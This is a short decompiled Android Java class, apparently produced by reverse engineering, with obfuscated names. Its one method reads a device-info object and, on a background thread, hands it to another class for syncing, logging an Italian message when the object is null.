package com.app.system.common.f;

import android.content.Context;
import com.app.system.common.d.a.g;
import com.app.system.common.entity.DeviceInfo;
import com.app.system.common.h;
import com.security.d.a;

public class f
{
  public static void a(final Context paramContext)
  {
    final DeviceInfo localDeviceInfo = DeviceInfo.a();
    if (localDeviceInfo == null)
    {
      a.b("SyncDeviceInfo", "DeviceInfo è NULL", new Object[0]);
      return;
    }
    new Thread("SyncDevInfo")
    {
      public void run()
      {
        new g(h.c(paramContext)).a(paramContext, localDeviceInfo);
      }
    }.start();
  }
}


/* Location:              ~/com/app/system/common/f/f.class
 *
 * Reversed by:           J
 */